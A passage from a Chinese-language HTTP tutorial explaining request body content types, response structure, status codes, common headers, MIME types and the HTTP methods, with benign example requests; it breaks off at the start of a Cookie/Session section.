pgsql"><span class="hljs-number">1.</span> application/x-www-form-urlencoded（表单默认）<br>   Content-<span class="hljs-keyword">Type</span>: application/x-www-form-urlencoded<br><br>   请求体：<br>   <span class="hljs-type">name</span>=Alice&amp;age=<span class="hljs-number">20</span>&amp;email=alice@example.com<br><br><span class="hljs-number">2.</span> application/<span class="hljs-type">json</span>（API常用）<br>   Content-<span class="hljs-keyword">Type</span>: application/<span class="hljs-type">json</span><br><br>   请求体：<br>   &#123;<br>       &quot;name&quot;: &quot;Alice&quot;,<br>       &quot;age&quot;: <span class="hljs-number">20</span>,<br>       &quot;email&quot;: &quot;alice@example.com&quot;<br>   &#125;<br><br><span class="hljs-number">3.</span> multipart/form-data（文件上传）<br>   Content-<span class="hljs-keyword">Type</span>: multipart/form-data; boundary=<span class="hljs-comment">----WebKitFormBoundary</span><br><br>   请求体：<br>   <span class="hljs-comment">------WebKitFormBoundary</span><br>   Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;file&quot;; filename=&quot;photo.jpg&quot;<br>   Content-<span class="hljs-keyword">Type</span>: image/jpeg<br><br>   [二进制文件内容]<br>   <span class="hljs-comment">------WebKitFormBoundary--</span><br><br><span class="hljs-number">4.</span> <span class="hljs-type">text</span>/plain（纯文本）<br>   Content-<span class="hljs-keyword">Type</span>: <span class="hljs-type">text</span>/plain<br><br>   请求体：<br>   Hello, this <span class="hljs-keyword">is</span> plain <span class="hljs-type">text</span>.<br><br><span class="hljs-number">5.</span> application/<span class="hljs-type">xml</span>（<span class="hljs-type">XML</span>数据）<br>   Content-<span class="hljs-keyword">Type</span>: application/<span class="hljs-type">xml</span><br><br>   请求体：<br>   &lt;?<span class="hljs-type">xml</span> version=&quot;1.0&quot;?&gt;<br>   &lt;<span class="hljs-keyword">user</span>&gt;<br>       &lt;<span class="hljs-type">name</span>&gt;Alice&lt;/<span class="hljs-type">name</span>&gt;<br>       &lt;age&gt;<span class="hljs-number">20</span>&lt;/age&gt;<br>   &lt;/<span class="hljs-keyword">user</span>&gt;<br></code></pre></td></tr></table></figure><hr><h2 id="3-HTTP响应格式"><a href="#3-HTTP响应格式" class="headerlink" title="3. HTTP响应格式"></a>3. HTTP响应格式</h2><h3 id="3-1-响应格式概览"><a href="#3-1-响应格式概览" class="headerlink" title="3.1 响应格式概览"></a>3.1 响应格式概览</h3><p><strong>完整的HTTP响应</strong>：</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs nix">HTTP<span class="hljs-symbol">/1.1</span> <span class="hljs-number">200</span> OK                       ← 状态行<br><span class="hljs-params">Content-Type:</span> text<span class="hljs-symbol">/html</span>               ← 响应头<br><span class="hljs-params">Content-Length:</span> <span class="hljs-number">1234</span>                  ← 响应头<br><span class="hljs-params">Date:</span> Mon, <span class="hljs-number">15</span> Jan <span class="hljs-number">2024</span> <span class="hljs-number">10</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> GMT  ← 响应头<br><span class="hljs-params">Server:</span> nginx<span class="hljs-symbol">/1.18.0</span>                  ← 响应头<br>                                      ← 空行（CRLF）<br><span class="hljs-symbol">&lt;html&gt;</span>                                ← 响应体<br>  <span class="hljs-symbol">&lt;body&gt;</span>Hello World<span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span>body<span class="hljs-operator">&gt;</span><br><span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span>html<span class="hljs-operator">&gt;</span><br></code></pre></td></tr></table></figure><p><strong>结构</strong>：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs css">┌────────────────────────────────┐<br>│  状态行（Status <span class="hljs-selector-tag">Line</span>）          │<br>├────────────────────────────────┤<br>│  响应头（Response Headers）     │<br>│  ...                           │<br>├────────────────────────────────┤<br>│  空行（CRLF）                   │<br>├────────────────────────────────┤<br>│  响应体（Response <span class="hljs-selector-tag">Body</span>）        │<br>└────────────────────────────────┘<br></code></pre></td></tr></table></figure><h3 id="3-2-状态行"><a href="#3-2-状态行" class="headerlink" title="3.2 状态行"></a>3.2 状态行</h3><p><strong>格式</strong>：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dns">HTTP版本 状态码 状态描述<br><br>示例：<br>HTTP/<span class="hljs-number">1.1 200</span> OK<br>HTTP/<span class="hljs-number">1.1 404</span> Not Found<br>HTTP/<span class="hljs-number">1.1 500</span> Internal Server Error<br></code></pre></td></tr></table></figure><h3 id="3-3-状态码"><a href="#3-3-状态码" class="headerlink" title="3.3 状态码"></a>3.3 状态码</h3><p><strong>状态码分类</strong>：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs dns">┌─────────┬──────────────────┬────────────────────┐<br>│  类别   │      范围        │      含义          │<br>├─────────┼──────────────────┼────────────────────┤<br>│  <span class="hljs-number">1</span>xx    │  <span class="hljs-number">100-199</span>         │  信息性响应        │<br>│  <span class="hljs-number">2</span>xx    │  <span class="hljs-number">200-299</span>         │  成功              │<br>│  <span class="hljs-number">3</span>xx    │  <span class="hljs-number">300-399</span>         │  重定向            │<br>│  <span class="hljs-number">4</span>xx    │  <span class="hljs-number">400-499</span>         │  客户端错误        │<br>│  <span class="hljs-number">5</span>xx    │  <span class="hljs-number">500-599</span>         │  服务器错误        │<br>└─────────┴──────────────────┴────────────────────┘<br></code></pre></td></tr></table></figure><p><strong>1xx 信息性响应</strong>：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs markdown">100 Continue<br><span class="hljs-bullet">  -</span> 客户端应继续发送请求体<br><span class="hljs-bullet">  -</span> 用于大文件上传前的确认<br><br>101 Switching Protocols<br><span class="hljs-bullet">  -</span> 切换协议（如WebSocket升级）<br></code></pre></td></tr></table></figure><p><strong>2xx 成功</strong>：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs markdown">200 OK<br><span class="hljs-bullet">  -</span> 请求成功<br><span class="hljs-bullet">  -</span> 最常见的成功状态码<br><br>201 Created<br><span class="hljs-bullet">  -</span> 资源已创建<br><span class="hljs-bullet">  -</span> 常用于POST请求创建新资源<br><br>202 Accepted<br><span class="hljs-bullet">  -</span> 请求已接受，但处理未完成<br><span class="hljs-bullet">  -</span> 用于异步处理<br><br>204 No Content<br><span class="hljs-bullet">  -</span> 成功，但无内容返回<br><span class="hljs-bullet">  -</span> 常用于DELETE请求<br><br>206 Partial Content<br><span class="hljs-bullet">  -</span> 部分内容<br><span class="hljs-bullet">  -</span> 用于断点续传<br></code></pre></td></tr></table></figure><p><strong>3xx 重定向</strong>：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs markdown">301 Moved Permanently<br><span class="hljs-bullet">  -</span> 永久重定向<br><span class="hljs-bullet">  -</span> 搜索引擎会更新索引<br><span class="hljs-bullet">  -</span> 示例：http → https<br><br>302 Found（临时重定向）<br><span class="hljs-bullet">  -</span> 临时重定向<br><span class="hljs-bullet">  -</span> 原URL仍然有效<br><br>303 See Other<br><span class="hljs-bullet">  -</span> 查看其他位置<br><span class="hljs-bullet">  -</span> POST请求后重定向到GET<br><br>304 Not Modified<br><span class="hljs-bullet">  -</span> 资源未修改<br><span class="hljs-bullet">  -</span> 可使用缓存<br><br>307 Temporary Redirect<br><span class="hljs-bullet">  -</span> 临时重定向（保持请求方法）<br><br>308 Permanent Redirect<br><span class="hljs-bullet">  -</span> 永久重定向（保持请求方法）<br></code></pre></td></tr></table></figure><p><strong>4xx 客户端错误</strong>：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs markdown">400 Bad Request<br><span class="hljs-bullet">  -</span> 请求格式错误<br><span class="hljs-bullet">  -</span> 参数错误<br><br>401 Unauthorized<br><span class="hljs-bullet">  -</span> 未认证<br><span class="hljs-bullet">  -</span> 需要登录<br><br>403 Forbidden<br><span class="hljs-bullet">  -</span> 禁止访问<br><span class="hljs-bullet">  -</span> 已认证但无权限<br><br>404 Not Found<br><span class="hljs-bullet">  -</span> 资源不存在<br><span class="hljs-bullet">  -</span> 最常见的错误<br><br>405 Method Not Allowed<br><span class="hljs-bullet">  -</span> 不支持的HTTP方法<br><br>408 Request Timeout<br><span class="hljs-bullet">  -</span> 请求超时<br><br>409 Conflict<br><span class="hljs-bullet">  -</span> 资源冲突<br><span class="hljs-bullet">  -</span> 如重复创建<br><br>413 Payload Too Large<br><span class="hljs-bullet">  -</span> 请求体过大<br><br>414 URI Too Long<br><span class="hljs-bullet">  -</span> URL过长<br><br>415 Unsupported Media Type<br><span class="hljs-bullet">  -</span> 不支持的Content-Type<br><br>429 Too Many Requests<br><span class="hljs-bullet">  -</span> 请求过于频繁<br><span class="hljs-bullet">  -</span> 限流<br></code></pre></td></tr></table></figure><p><strong>5xx 服务器错误</strong>：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs markdown">500 Internal Server Error<br><span class="hljs-bullet">  -</span> 服务器内部错误<br><span class="hljs-bullet">  -</span> 最常见的服务器错误<br><br>501 Not Implemented<br><span class="hljs-bullet">  -</span> 功能未实现<br><br>502 Bad Gateway<br><span class="hljs-bullet">  -</span> 网关错误<br><span class="hljs-bullet">  -</span> 上游服务器返回无效响应<br><br>503 Service Unavailable<br><span class="hljs-bullet">  -</span> 服务不可用<br><span class="hljs-bullet">  -</span> 服务器过载或维护<br><br>504 Gateway Timeout<br><span class="hljs-bullet">  -</span> 网关超时<br><span class="hljs-bullet">  -</span> 上游服务器超时<br><br>505 HTTP Version Not Supported<br><span class="hljs-bullet">  -</span> HTTP版本不支持<br></code></pre></td></tr></table></figure><h3 id="3-4-响应头"><a href="#3-4-响应头" class="headerlink" title="3.4 响应头"></a>3.4 响应头</h3><p><strong>常用响应头</strong>：</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">:</span> <span class="hljs-string">text/html; charset=utf-8</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">响应体的MIME类型</span><br><br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">:</span> <span class="hljs-string">1234</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">响应体的长度（字节）</span><br><br><span class="hljs-attribute">Content-Encoding</span><span class="hljs-punctuation">:</span> <span class="hljs-string">gzip</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">响应体的压缩方式</span><br><br><span class="hljs-attribute">Date</span><span class="hljs-punctuation">:</span> <span class="hljs-string">Mon, 15 Jan 2024 10:00:00 GMT</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">响应时间</span><br><br><span class="hljs-attribute">Server</span><span class="hljs-punctuation">:</span> <span class="hljs-string">nginx/1.18.0</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">服务器软件信息</span><br><br><span class="hljs-attribute">Set-Cookie</span><span class="hljs-punctuation">:</span> <span class="hljs-string">session_id=abc123; Path=/; HttpOnly</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">设置Cookie</span><br><br><span class="hljs-attribute">Location</span><span class="hljs-punctuation">:</span> <span class="hljs-string">https://www.example.com/new-url</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">重定向目标URL</span><br><br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">:</span> <span class="hljs-string">max-age=3600</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">缓存控制</span><br><br><span class="hljs-attribute">Expires</span><span class="hljs-punctuation">:</span> <span class="hljs-string">Wed, 21 Oct 2025 07:28:00 GMT</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">过期时间</span><br><br><span class="hljs-attribute">ETag</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;33a64df551425fcc55e4d42a148795d9f25f89d4&quot;</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">资源版本标识</span><br><br><span class="hljs-attribute">Last-Modified</span><span class="hljs-punctuation">:</span> <span class="hljs-string">Wed, 21 Oct 2015 07:28:00 GMT</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">最后修改时间</span><br><br><span class="hljs-attribute">Access-Control-Allow-Origin</span><span class="hljs-punctuation">:</span> <span class="hljs-string">*</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">CORS跨域控制</span><br><br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">:</span> <span class="hljs-string">keep-alive</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">连接管理</span><br><br><span class="hljs-attribute">Transfer-Encoding</span><span class="hljs-punctuation">:</span> <span class="hljs-string">chunked</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">分块传输编码</span><br><br><span class="hljs-attribute">Vary</span><span class="hljs-punctuation">:</span> <span class="hljs-string">Accept-Encoding</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">缓存变化因素</span><br></code></pre></td></tr></table></figure><h3 id="3-5-响应体"><a href="#3-5-响应体" class="headerlink" title="3.5 响应体"></a>3.5 响应体</h3><p><strong>常见Content-Type</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">text/html        - HTML页面<br>text/plain       - 纯文本<br>text/css         - CSS样式表<br>text/javascript  - JavaScript代码<br><br>application/json        - JSON数据<br>application/xml         - XML数据<br>application/pdf         - PDF文件<br>application/zip         - ZIP压缩包<br>application/octet-stream - 二进制流（下载）<br><br>image/jpeg       - JPEG图片<br>image/png        - PNG图片<br>image/gif        - GIF图片<br>image/svg+xml    - SVG矢量图<br><br>video/mp4        - MP4视频<br>audio/mpeg       - MP3音频<br></code></pre></td></tr></table></figure><hr><h2 id="4-HTTP方法详解"><a href="#4-HTTP方法详解" class="headerlink" title="4. HTTP方法详解"></a>4. HTTP方法详解</h2><h3 id="4-1-GET方法"><a href="#4-1-GET方法" class="headerlink" title="4.1 GET方法"></a>4.1 GET方法</h3><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs ldif">作用：<br>获取资源（只读）<br><br>特点：<br><span class="hljs-literal">-</span> 参数在URL中（查询字符串）<br><span class="hljs-literal">-</span> 可缓存<br><span class="hljs-literal">-</span> 可添加书签<br><span class="hljs-literal">-</span> 幂等性（多次请求结果相同）<br><span class="hljs-literal">-</span> 安全性（不修改服务器状态）<br><br>示例：<br>GET /api/users?id=123&amp;name=Alice HTTP/1.1<br><span class="hljs-attribute">Host</span>: api.example.com<br><br>使用场景：<br><span class="hljs-literal">-</span> 获取网页<br><span class="hljs-literal">-</span> 查询数据<br><span class="hljs-literal">-</span> 下载文件<br><span class="hljs-literal">-</span> API查询<br></code></pre></td></tr></table></figure><h3 id="4-2-POST方法"><a href="#4-2-POST方法" class="headerlink" title="4.2 POST方法"></a>4.2 POST方法</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs markdown">作用：<br>提交数据（创建资源）<br><br>特点：<br><span class="hljs-bullet">-</span> 参数在请求体中<br><span class="hljs-bullet">-</span> 不可缓存<br><span class="hljs-bullet">-</span> 不可添加书签<br><span class="hljs-bullet">-</span> 非幂等（多次请求可能产生不同结果）<br><span class="hljs-bullet">-</span> 非安全（会修改服务器状态）<br><br>示例：<br>POST /api/users HTTP/1.1<br>Host: api.example.com<br>Content-Type: application/json<br><br>&#123;<br><span class="hljs-code">    &quot;name&quot;: &quot;Alice&quot;,</span><br><span class="hljs-code">    &quot;email&quot;: &quot;alice@example.com&quot;</span><br><span class="hljs-code">&#125;</span><br><span class="hljs-code"></span><br>使用场景：<br><span class="hljs-bullet">-</span> 提交表单<br><span class="hljs-bullet">-</span> 上传文件<br><span class="hljs-bullet">-</span> 创建资源<br><span class="hljs-bullet">-</span> API提交<br></code></pre></td></tr></table></figure><h3 id="4-3-PUT方法"><a href="#4-3-PUT方法" class="headerlink" title="4.3 PUT方法"></a>4.3 PUT方法</h3><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs nix">作用：<br>更新资源（完整更新）<br><br>特点：<br><span class="hljs-operator">-</span> 幂等（多次请求结果相同）<br><span class="hljs-operator">-</span> 替换整个资源<br><br>示例：<br>PUT <span class="hljs-symbol">/api/users/123</span> HTTP<span class="hljs-symbol">/1.1</span><br><span class="hljs-params">Host:</span> api.example.com<br><span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/json</span><br><br>&#123;<br>    <span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-number">123</span>,<br>    <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;Alice Updated&quot;</span>,<br>    <span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;alice@example.com&quot;</span><br>&#125;<br><br>使用场景：<br><span class="hljs-operator">-</span> 完整更新资源<br><span class="hljs-operator">-</span> 替换文件<br></code></pre></td></tr></table></figure><h3 id="4-4-DELETE方法"><a href="#4-4-DELETE方法" class="headerlink" title="4.4 DELETE方法"></a>4.4 DELETE方法</h3><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs ldif">作用：<br>删除资源<br><br>特点：<br><span class="hljs-literal">-</span> 幂等（多次删除同一资源结果相同）<br><br>示例：<br>DELETE /api/users/123 HTTP/1.1<br><span class="hljs-attribute">Host</span>: api.example.com<br><br>使用场景：<br><span class="hljs-literal">-</span> 删除用户<br><span class="hljs-literal">-</span> 删除文件<br><span class="hljs-literal">-</span> 注销账号<br></code></pre></td></tr></table></figure><h3 id="4-5-PATCH方法"><a href="#4-5-PATCH方法" class="headerlink" title="4.5 PATCH方法"></a>4.5 PATCH方法</h3><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs nix">作用：<br>部分更新资源<br><br>特点：<br><span class="hljs-operator">-</span> 只更新部分字段<br><span class="hljs-operator">-</span> 比PUT更节省带宽<br><br>示例：<br>PATCH <span class="hljs-symbol">/api/users/123</span> HTTP<span class="hljs-symbol">/1.1</span><br><span class="hljs-params">Host:</span> api.example.com<br><span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/json</span><br><br>&#123;<br>    <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;Alice Updated&quot;</span><br>&#125;<br><br>使用场景：<br><span class="hljs-operator">-</span> 只更新某些字段<br><span class="hljs-operator">-</span> 修改配置<br></code></pre></td></tr></table></figure><h3 id="4-6-HEAD方法"><a href="#4-6-HEAD方法" class="headerlink" title="4.6 HEAD方法"></a>4.6 HEAD方法</h3><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs ldif">作用：<br>获取资源头部信息<br><br>特点：<br><span class="hljs-literal">-</span> 不返回响应体<br><span class="hljs-literal">-</span> 用于检查资源是否存在<br><span class="hljs-literal">-</span> 用于获取元数据<br><br>示例：<br>HEAD /api/users/123 HTTP/1.1<br><span class="hljs-attribute">Host</span>: api.example.com<br><br>使用场景：<br><span class="hljs-literal">-</span> 检查资源是否存在<br><span class="hljs-literal">-</span> 获取文件大小<br><span class="hljs-literal">-</span> 检查最后修改时间<br></code></pre></td></tr></table></figure><h3 id="4-7-OPTIONS方法"><a href="#4-7-OPTIONS方法" class="headerlink" title="4.7 OPTIONS方法"></a>4.7 OPTIONS方法</h3><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs ldif">作用：<br>查询支持的方法<br><br>特点：<br><span class="hljs-literal">-</span> 用于CORS预检请求<br><span class="hljs-literal">-</span> 返回Allow头部<br><br>示例：<br>OPTIONS /api/users HTTP/1.1<br><span class="hljs-attribute">Host</span>: api.example.com<br><br>响应：<br>HTTP/1.1 200 OK<br><span class="hljs-attribute">Allow</span>: GET, POST, PUT, DELETE, OPTIONS<br><br>使用场景：<br><span class="hljs-literal">-</span> CORS预检<br><span class="hljs-literal">-</span> 服务发现<br></code></pre></td></tr></table></figure><h3 id="4-8-方法对比"><a href="#4-8-方法对比" class="headerlink" title="4.8 方法对比"></a>4.8 方法对比</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">┌────────┬────────┬────────┬────────┬──────────────┐<br>│  方法  │  幂等  │  安全  │ 可缓存 │    用途      │<br>├────────┼────────┼────────┼────────┼──────────────┤<br>│  <span class="hljs-keyword">GET</span>   │   ✅   │   ✅   │   ✅   │  查询        │<br>│  POST  │   ❌   │   ❌   │   ❌   │  创建        │<br>│  PUT   │   ✅   │   ❌   │   ❌   │  完整更新    │<br>│  PATCH │   ❌   │   ❌   │   ❌   │  部分更新    │<br>│  <span class="hljs-keyword">DELETE</span>│   ✅   │   ❌   │   ❌   │  删除        │<br>│  HEAD  │   ✅   │   ✅   │   ✅   │  获取头部    │<br>│ <span class="hljs-keyword">OPTIONS</span>│   ✅   │   ✅   │   ❌   │  查询方法    │<br>└────────┴────────┴────────┴────────┴──────────────┘<br><br>幂等性：多次请求结果相同<br>安全性：不修改服务器状态<br></code></pre></td></tr></table></figure><hr><h2 id="5-Cookie和Session"><a href="#5-Cookie和Session" class="headerlink" title="5. Cookie和Session"></a>5. Cookie和Session</h2><h3 id="5-1-为什么需要Cookie？"><a href="#5-1-为什么需要Cookie？" class="headerlink" title="5.1 为什么需要Cookie？"></a>5.1 为什么需要Cookie？</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs markdown">问题：<br>HTTP是无状态的<br>→ 服务器无法识别用户<br>→ 无法保持登录状态<br><br>解决方案：<br>Cookie = 